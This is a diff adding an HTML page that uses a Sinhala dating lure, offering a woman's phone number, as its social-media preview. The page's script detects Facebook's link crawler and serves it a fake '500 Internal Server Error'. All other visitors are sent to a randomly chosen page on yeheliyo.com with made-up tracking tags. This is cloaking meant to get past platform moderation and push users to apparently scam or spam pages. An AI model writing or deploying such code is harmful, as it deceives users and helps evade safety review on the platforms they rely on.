@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>අපි Chat කරමුද | මම මදු</title>
+	
+	<meta property="og:title" content="අපි Chat කරමුද | මම මදු" />
+	<meta property="og:description" content="මගේ නම්බර් එක දැම්මා මේකේ. ඔබලා ගන්න." />
+	<meta property="og:image" content="https://i.imgur.com/brBjU2Z.png" />
+	
+    <script>
+        window.onload = function() {
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+
+            // Otherwise, redirect to a random page
+            const pages = [
+                "https://yeheliyo.com/Neptune/index.php?utm_source=facebook&utm_medium=cpc&utm_campaign=faceook_messenger&utm_id=facebook&utm_term=video_calls&utm_content=dating",
+                "https://yeheliyo.com/Neptune/NexStar?utm_source=google&utm_medium=organic&utm_campaign=google_project",
+                "https://yeheliyo.com/Neptune/Celestron/index.php?utm_source=pinterest&utm_medium=organic&utm_campaign=google_redirect",
+                "https://yeheliyo.com/Neptune/Hubble-Space/?utm_source=facebook&utm_medium=organic&utm_campaign=facebook",
+                "https://yeheliyo.com/Neptune/AstroMaster/?utm_source=twitter&utm_medium=organic&utm_campaign=google_redirect"
+            ];
+            const randomPage = pages[Math.floor(Math.random() * pages.length)];
+            window.location.href = randomPage;
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
